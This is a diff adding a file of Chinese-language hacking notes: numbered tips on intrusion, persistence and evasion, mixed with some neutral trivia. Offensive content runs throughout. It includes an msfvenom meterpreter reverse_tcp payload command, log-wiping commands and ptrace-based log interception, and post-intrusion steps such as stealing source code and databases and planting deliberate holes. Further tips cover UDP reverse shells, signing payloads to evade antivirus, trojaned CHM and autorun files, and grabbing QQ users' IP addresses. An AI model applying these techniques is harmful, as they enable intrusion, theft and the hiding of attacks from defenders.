@@ -1,0 +1,225 @@
+顶级黑客手中掌握的社工库数量超过10亿条。数据量可以作为一种衡量标准。
+国外上公开的EXP代码网站：  结果黑客工具以及漏洞利用代码EXP可能是病毒，有人就遇到过EXP是格式化自己磁盘的。
+	Epxloit-db
+	SercurityFocus
+	Searchsploit
+	1.把你的U盘丢了，让目标人员捡走。
+	2.农行登录的时候要求关闭浏览器其他界面，难道是防止跨站？
+	3. autorun.inf是当打开它所在的盘时,就自动运行的小程序.比如我们把MTV光盘放入光驱的时候,有时候就会自动开始播放了
+	4.CTF比赛每一轮尽可能日完更多的人。日下来，第一时间种后门和抓鸡，然后检测文件改动。。
+	5.安全问题的根源：人会犯错。尤其分层导致的各个人的片面工作，
+	6.注册表可以用来完成开机启动的地方非常多。
+	7.概念验证Proof of concept（POC）：对想法的不完整实现从而证明其可行性。常用来用作0day、exploit的别名（通常指没有充分利用漏洞的expolit）
+	8.临时邮箱：https://link.zhihu.com/?target=http%3A//10minutemail.com/10MinuteMail/index.html（从知乎的跳转）
+	9.左老师的摄像头项目告诉我：一个程序，出于简单开发的考虑，可能十分简单。要想读取摄像头的媒体数据只需要一个连接就好。所以以后端口扫描程序可以都去尝试一下，并分析回流。
+	10.
+windows  telnet：
+控制面板-》程序和功能-》打开或关闭windows功能-》Telnet服务端、Telnet客户端。如果打开成功就能使用telnet命令了。
+telnet服务器还需要在services.msc中开启服务。在这里配置好登录账户，你需要把账户加到自动创建的TelnetClients组里面：
+	0.默认设置是可以直接启动服务的。其实相当于账户是NT AUTHORITY\LocalService，密码为空的配置。（这是个虚拟账户，名字叫做“本地服务”）
+	1.我设置为本地系统账户结果就说“错误13：数据无效”而不能启动服务，可能是因为我的系统账户没有密码
+	2.然后我就是使用另外一个“此账户”，指定计算机上面的账户，要求账户名字与密码都是本机，否则就“错误1069：由于登录失败而无法启动服务”
+	3.我使guest（开头的字母可以不用大写）active，并且设置密码，然后配置telnet，遇到“错误1297：服务账户配置中不存在服务正常运行所需的特权”。这时候应该设置secpol.msc（Local Security Settings MMC）在里面设置账户权限。然而发现我的win10与win7因为是HOME版本C盘windows目录下的system32目录下里面都没有gpedit.msc组策略和secpol.msc安全组。lusrmgr.msc打开来会说此版本不能使用。
+	4.要是觉得自己配置错误了，可以在“打开或者关闭windows功能”中重新安装telnet服务。
+	“此账户”配置：
+	此账户：.\telnet 这是指定使用叫做telnet的账户
+	密码：xxxx 确认密码：xxxx  我密码只输入了5位，但是它自己补成了好几位，还不允许C-C，估计是防止特殊工具的查看。
+	5.最终解决，使将账户加入到TelnetClients，然后使用虚拟账户或者说默认配置本地服务就好了，之后就可以连接了。但是我把Administrator这个账户也加进去，却不能使用这个账户进行登录。
+微软给telnet使用的认证是NTLM认证。
+	登录演示：（和mssql类似，登陆三次失败就断开连接）
+	root@kali:~# telnet 192.168.1.133 #telnet IP/域名 port
+	Trying 192.168.1.133...
+	root@kali:~# telnet www.hellovega.cn 80 #通过不同的显示用于端口检查
+	Trying 58.216.107.101...
+	Connected to 212.tc.sp.cdntip.com.
+	Escape character is '^]'.
+	telnet: Unable to connect to remote host: Connection timed out
+	root@kali:~# telnet 192.168.1.133
+	Trying 192.168.1.133...
+	Connected to 192.168.1.133.
+	Escape character is '^]'.
+	Welcome to Microsoft Telnet Service 
+
+	login: 
+	
+	
+	
+linux telnet：
+你可以判断当前运行的操作系统版本，多数UNIX系统都会在连接时报告这类消息
+	6.一旦发生中美严重对抗，美国很容易攻击 Intel inside 的设备，却很难攻击“龙芯 inside”的设备和系统。CPU 和内存控制器在内的所有的模块都是自主设计的。入侵的底层其实已经实现了。
+	7.Rapid7一家全球领先的安全风险信息解决方案提供商
+	8.autorun.inf
+ 
+[autorun]
+open=template.pdf 这是一个有渗透的pdf
+icon=autorun.ico
+
+YUMI制作的U盘autorun.inf内容：
+[AutoRun.Amd64]
+open=setup.exe
+icon=setup.exe,0
+
+[AutoRun]
+open=sources\SetupError.exe x64
+icon=sources\SetupError.exe,0
+
+
+OSX：AutoUnattend.xml
+	9.中国铁路的自动售票机器是winodws XP系统，可以调出来，而且我见到过有人执行了cmd，并且使用了虚拟键盘。
+	10.qq只有直接传文件和图片，是采用点到点。所以这样就可以获取别人的ip。如果是文本消息直接加密走服务器。因为通信量大，腾讯现在只读取特征码。文件要看大小和传输类型 过不过服务器。直接通过端口查看就好。任务管理器，性能，资源监控器，勾选QQ的全部进程，观察网络页签。
+Tim不适用（张小龙团队解决了不少qq的马化腾团队的弊端），只有标准版QQ才适合。TIM还是有方法的，提到了篡改包头。
+
+QQ加载带网页图片的xml时客户端会直接从网页获取该图片，不会经过腾讯的服务器，这个时候可以抓到ip并进行定位
+	11.有的摄像头在开启时灯会亮
+	12.SLMail is SMTP and POP3 email server software for Microsoft Windows NT and 2000.
+	13.FTP远程管理程序的配置文件很吸引人。你帮他换成有exp的版本...嘿嘿
+Serv-U、ProFTPd （伪装Linux ProFTPD服务器 Windows下的FTP服务多是Serv-U）
+VNC、PCAnyWhere
+Radmin（从前安装的时候都是将密码写入HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter）
+
+	14.webshell有菜刀配合，所以有的人拿到shell就转成webshell使用，但是这样是容易暴露的，shell肯定可以写出配合工具。
+	15.网站编辑器是管理员的工具，但是常常因为漏洞（比如说直接访问）
+FCKeditor 早期版本存在漏洞：FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors
+上传以后的文件默认在/jsp或asp或aspx或cfm/connector
+
+CuteEditor、EWebEditor（默认情况下这编辑器数据库可以被下载，默认账号密码admin）
+	16.在用小马上传文件之前先试着创建一个文件夹来试探一下。
+	17.有名气的模板：
+Dvbbs
+动网
+Discuz!
+WordPress
+	18.总被说起mdb数据库名字里面带了#会导致无法下载？浏览器不行吗，那下载器也不行吗。不过有一个解决办法是在下载路径中将#改为%23.
+	19.逗逼管理员，像存放上传图片的目录根本不需要脚本执行权限。
+	20.很多服务器是放在虚拟服务上面的。
+	21.服务器权限：
+2003的IUSER不能访问exe（那时候在C:\Windows\system32\CMD.exe），处理办法就是自己上传一个cmd.exe
+	22.马名字：
+systemcontrol
+newasp
+后进去以后再根据已有文件命名来改
+	用户名：
+iis_helper
+	23.网站入侵以后：
+注意一些应用的密码ssh、SQL、管理员后台登录
+一般第一时间拖走源码（方便之后入侵）和数据库
+检查其他shell，收入武器库
+
+尝试恢复从前的漏洞，我是指降级？和改动代码来制造漏洞。
+	24.服务器环境有多种，那么jsp shell不行就换php shell。
+	25.渗透不了网站就渗透ISP提供商。胆大心细。
+	26.敏感文件：
+apache:/etc/httpd/conf/httpd.conf
+	27.asp能不能被下载和会不会经过解析是不相关的事情。
+	28.下载快乐星球歌曲的时候由于过快，导致我没能看到网速变化。
+	29.手机卡停机以后，充值以后，需要重开数据开关才能收到信号。
+	30.使用vi编辑文本文件会产生一个交换文件，这个文件没准可以直接通过web进行下载。
+	31.知道文件备份以后也是种维持站点控制的途径。
+	32.windows源码发生过泄露：
+微软会将自己的源代码给政府，传闻曾经给过俄罗斯政府，希望借此提升微软产品在俄罗斯公家机关的销售量。
+2004年的Windows 2000源代码、Windows NT 4.0源代码
+
+2017年尚未公开发布的绝密Windows 10和Windows Server 2016版本，以及已经公开发布的数个Windows版本代码泄露，泄漏在BetaArchive 网站（这网站经常有windows的内部测试安装版本），代码主要提供给产商。The folder itself was 1.2GB in size, contained 12 releases each being 100MB：
+>PnP code
+Who would want the Windows behaviour of having to install the driver for a device all over again if you plug it in a different port?
+>USB stack
+See above
+>Wi-Fi stack
+Windows' built-in Wifi stack is so bad that people usually have to install Intel's as replacement
+>storage drivers
+See above. Except this time people would install Intel's AHCI/RAID controller drivers even if they aren't using Intel chipsets
+>ARM-specific OneCore kernel code
+LOL
+只找到类似于代码文件树的存在https://pastebin.com/raw/VGEbWVSM，没能找到代码
+	33.通过电脑向QQ空间发出网址，然后就会自动转化为腾讯的http://url.cn/4B291Mt 。
+	34.firefox中的flash插件不太稳定啊，很容易造成浏览器卡死。
+	35.如果get提交实在无法绕过，可以尝试改变攻击方式。如；post注入、寻找子站、旁站……等
+	36.如果tomcat将php文件视为简单的文本文件，那么如果一台服务器上有多款服务器软件，那么通过不同的端口进行访问，就能进行原代码的下载。
+	37.iis自带FTP
+	38.一般人们只检查TCP协议上的端口开启情况，你或许可以以UDP的方式来返回一个shell，延长被发现的时间。
+	39.zmap-40分钟扫完全世界IP。带宽足够的话。
+	40.审核变成了对上传照片中的手持身份证上数字的识别，我估计还会判断下是否有人脸
+	41.正常来说，所有脚本类型都能弹回来，跟本地环境有关，php的是直接创造sock，挂在php进程里，asp的是靠写入二进制文件到tmp下再exec(容易被avkill掉)，aspx是.net创建sock，jar也是直接寄存于父进程也就是java里，psh是寄存在自身powershell线程里的，py、pl、rb都是挂在解析器进程里的，vb是写入二进制再执行类似于asp，cmd也是同理asp
+	42.毫无戒心的用户，打开一个rar包，对这个rar进行解析的时候就可能已经中招了。
+	43.runtime process infection（运行时过程感染）   最常见的手段就是dll注入
+	44.日志清理工具：
+	使用日志清理库Liblogclean
+		logclean-ng  -w /var/log/wtmp -u w00t -r root 删除掉who日志中的w00t用户有关日志，保留root有关日志
+	但是更高级的方式并不是怎么更干净地清理，而是通过比如ptrace()系统调用（用于调试和追踪进程，可以使得一个进程控制另外一个进程），在日志写入之前就拦截。写日志的进程/usr/sbin/rsyslogd（之前叫做syslogd）。
+	NAT转换日志记得清理。
+	45.APT攻击中“持续的”是指有一个长远的目标
+	
+	46.容易让人关闭的网页：
+	一个一直在“Wait Please…..Loading”
+	看小说经常会弹出来的游戏、广告、xx诱惑界面
+	47.cain的Decoders-》LSA secrets—》local system 能直接触发“一分钟后关闭windows”，并且没有办法进行阻止。
+	48.cd “.. "这名字看起来挺吓唬人的
+	49.针对信息协议的攻击：
+	当黑客视图连接防护墙后面不可访问的计算机A的时候，会被防火墙阻止。但是传闻在请求报文中，设置IP地址源路径，使得报文的某一个目的地指向的防火墙，但是最终的地质指向的是计算机A。这时候就不会被拦截。并经过防火墙发送到了内部网络。
+	50.ICMP重定向攻击实现MITM：
+	通过ICMP重定向消息，将连接重定向到一个不安全的计算机，从中实现MITM攻击。ettercap可以实现。
+	51.热键漏洞：
+	在windows注销的时候，但是热键服务还是开着的， 所以之前就有一种按5下Shift键，就能直接进入远程桌面。
+	书上介绍了一种替换exe的方法，将轻松访问里面的“朗读屏幕内容（讲述人）”对应的Narrator.exe替换成相同目录中的cmd.eex或者自己的shell。本想说这时候进入程序就能通过net user xxx xx /add ，但是想起来权限不够。所以在替换exe的时候应该使用自己的程序，返回一个提权的exe。
+	52.建议可以将可执行文件的图标改成QQ的快捷方式。
+	53.木马与病毒应该有自我恢复的能力。本地备份或者像现在的云病毒一样，直接从云端现在病毒的实体。
+	54.因为CHM文件是html文件组成的，所以可以其中加入木马网页。反编译出一个hhp文件（总管理文件）和html文件夹。使用QuickCHM插入我们木马网页。《黑客攻防 从入门到精通》中介绍的，在html文件中添加了一行html来执行同目录下的可执行文件。
+<object width=0””” height=”0” sytle=”display:none” codebase=”xxx.exe”>
+	55.跨平台可能更倾向于同样硬件架构的不同软件环境。可移植性，更倾向于强调硬件，比如 java可以运行在 x86机器上，同样的程序拿到64位机器上一样使用。现今的跨平台实现方法主要有两种，一种是“一次编译，到处运行”（就是java这种），还有一种是“一次编码，到处编译”（但是不能使用系统api），QT、cocos2d-x等等。他们都是做了一个系统平台无关的层。所以实现跨平台病毒还是java这种方法好一点。Windows、Linux、Unix目前都已经遵循了POSIX接口规范，这就使得他们中大部分的常用接口都是近似的，所以在跨平台框架里，这大部分的代码是可以共用的。不过我想通用指令集（CPU指定）一定跨平台。
+https://securelist.com/crossplatform-virus-the-latest-proof-of-concept/30157/ 跨平台的汇编病毒
+	56.通过扬声器和麦克风传输数据已经在一些应用中使用了，比如支付宝钱包。但由于普通麦克风在20KHz以上会有很大的衰减，所以使用的频率一般在15~19KHz之间。在这么低频的载波上是很难实现高速率的传输的，考虑功率和误码率等因素，估计在1米左右距离上实际传输速率不会超过500 bit/s。
+
+只要能表示出一个数据编码方式就能够传播。
+	57.Bi.a 病毒是之前使用汇编编写的，能够同时感染Windows 或Linux 计算机的POC病毒。
+	58.日志这种东西，不要以为操作没有什么就不需要清除了。即便是建立一个匿名连接，都是要清除日志的。任何东西基本都是要记录日志的。目前知道的默认情况下，半连接不会被web服务器记录日志。
+	59.存在一对多的远程控制。
+	60.文件加过壳会被杀毒软件重点监控，但是文件保护会被多数杀毒扫描引擎忽略。如果你想保证你的payload能起到作用，可以购买一个证书，然后用SDK中的signtool.exe给你的软件加上签名，这样会使得你的程序更加可信。
+	61.即便是添加信任以后，如果触发了检测还是会被阻止以及提醒。
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.182 lport=4443 -f msi -o /tmp/test.msi
+	62.Vmware虚拟机中的wireshark可以直接抓到同样桥接以及主机中的发出与返回包。
+	63.ICMP攻击：
+	针对连接的DoS攻击
+	　　针对连接的DoS攻击，可以终止现有的网络连接。针对网络连接的DoS攻击会影响所有的IP设备，因为它使用了合法的ICMP消息。Nuke通过发送一个伪造的ICMP Destination Unreachable或Redirect消息来终止合法的网络连接。更具恶意的攻击，如puke和smack，会给某一个范围内的端口发送大量的数据包，毁掉大量的网络连接，同时还会消耗受害主机CPU的时钟周期。
+	　　还有一些攻击使用ICMP Source Quench消息，导致网络流量变慢，甚至停止。Redirect和Router Announcement消息被利用来强制受害主机使用一个并不存在的路由器，或者把数据包路由到攻击者的机器，进行攻击。针对连接的DoS攻击不能通过打补丁的方式加以解决，通过过滤适当的ICMP消息类型，一般防火墙可以阻止此类攻击。
+	基于重定向(redirect)的路由欺骗技术  但是windows的第一条路由器是开着的
+	　　首先我们应该知道，微软的Windows98和NT系统都保持着一张已知的路由器列表，列表中位于第一项的路由器是默认路由器，如果默认路由器关闭，则位于列表第二项的路由器成为缺省路由器。缺省路由向发送者报告另一条到特定主机的更短路由，就是ICMP重定向。
+	63.Port stealing：
+	该技术主要用于局域网中间人攻击中，尤其路由器采用静态ARP后，导致ARP欺骗无效。背景知识：路由器为了方便转发数据包，会在内部记录每个接口和Mac地址的对应关系。例如，当计算机A通过网线向路由器发送了一个数据包，路由器会自动将该计算机Mac地址和网线所连接的接口B进行绑定。如果路由器收到要转发给A的数据包，就会将该包从接口B发出。A就可以顺利接受到数据包。这样，路由器就避免广播发包，同时其他计算机也无法获取A的数据包。技术实现：其他电脑C可以伪造计算机A的Mac地址进行发包，让路由器进行错误的绑定。这样发给A的包，就被发给C了。接受到数据包后，C再发送一个请求A的ARP包，A响应后，路由器重新绑定正确的A。最后，C把数据包转发给A。缺点：在ARP请求和恢复过程中，可能会造成C无法获取A的部分数据包。Ettercap已经实现Por Stealing技术。
+	64.DHCP Spoof：
+	由于dhcp服务没有认证过程，任何dhcp服务器都能为网络上的机器提供服务。实际上就是几个服务器竞争看谁反应快客户端就使用谁，这为中间人攻击提供了可能。ettercap中提供了此项功能，可以用scapy搭建一个dhcp服务器，用twisted建立一个DNS服务器：sudo twistd -n dns --recursive --cache。
+	65.NDP poison：  Neighbor Discovery Protocol 
+	NDP用来发现直接相连的邻居信息，包括邻接设备的设备名称、软/硬件版本、连接端口等，另外还可提供设备的ID、端口地址、硬件平台等信息。ARP replaced by NDP in IPv6。ettercap提供此项功能。
+	66.网站自己弄出了系统漏洞，但是这种漏洞很容易被漏洞扫描器扫描出来然后修补，建议在代码逻辑中挖一个确保只有自己知道的洞。目前只知道端口敲击这种防御方法。
+	67.产商喜欢收集信息，所以攻击掉产商的数据库，能够获取的有着很大的价值。
+	68.在车上按照预定的路线移动，并不断连接上面的AP，从而保证ip的变化。
+	69.一旦检测到开启360安全卫士，就搞一点事情，让它背锅。用户就会退出程序。
+	70.如果可以登录目标系统，那就可以扫出很多个问题。通过端口转发将扫描的包发送到目标主机，这样就会造成大量的流量，小心IDS。有时候本地安装一个也无所谓。
+	71.windows 通过echo 指令可以自己编写出一个可以执行的vbs脚本，通过cscript执行。在win7之前vbs是windows上的主要脚本语言，在win7开始变成了powershell。那么病毒的编写应该要向这个编写平台转变。
+PsExec   一种支持远程执行某一个程序的工具。
+	72.三大杀毒软件存严重漏洞，杀软可变黑客工具（2015年，出现原因：杀毒软件在一个可预测的地址中分配了用于读、写和执行权限的内存）
+	记得宾浩宇和我讲过，有一位人曾经通过发送qq窗口抖动就能够直接黑下来。
+	73.samba，当配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。
+smbclient -L //192.168.99.131 进行登录，需要password
+metasploit use auxiliary/admin/smb/samba_symlink_traversal 
+	74.数据库web管理软件的登录密码一般即数据库密码。
+	75.windows登陆另外的一个账户，但是qq的密码还是被保存着，这说明qq并没有将密码数据存储在C盘提供的数据文件夹中。
+	76.美国政府最早建立漏洞库NVD，非常的全面。后来将各种漏洞用于战略。
+	77.要想IE运行一个要了很多权限的Java Applet
+需要在IE中设置 安全站点
+需要在控制面板-》Java-》安全站点中增加指定的站点（这里的站点需要加上端口号）
+	78.ATM上安装针孔摄像头、键盘记录、卡信息新复制器。
+	79.手机攻击：
+手机漏洞
+伪基站
+SIM复制攻击，打电话只能够一方接收，发短信估计也是这样。
+DOS
+	80.摆渡攻击：摆渡攻击是一种专门针对移动存储设备，从与互联网物理隔离的内部网络中窃取文件资料的信息攻击手段。 最常见的就是U盘摆渡。
+	81.信息安全可以分为三个方面：
+技术安全类
+   采用具有一定安全性的硬件、软件来实现对计算机系统及其所存数据的安全保护。
+管理安全类
+    软硬件意外故障，场地的意外事故，计算机设备和数据介质的物理破坏、丢失等安全问题。
+政策法律类
+    政府部门建立的有关计算机犯罪、数据安全保密的法律道德准则和政策法规、法令。
+	82.数据库的安全：用户<->DBMS<->OS<->具体数据
+	83.编写程序的时候如果想要隐藏重要的接口，可以使用代理的思想，让程序访问自己的后台界面，这样通过自己设置的后台界面进行数据中转。别人通过wireshark分析到的也只是这一个代理接口，只有在拿下服务器以后才能看到真正的接口在哪里。但是如果他们想要的只是数据，那么这种代理做法返回能让别有用心的人利用起来，来一波栽赃嫁祸。
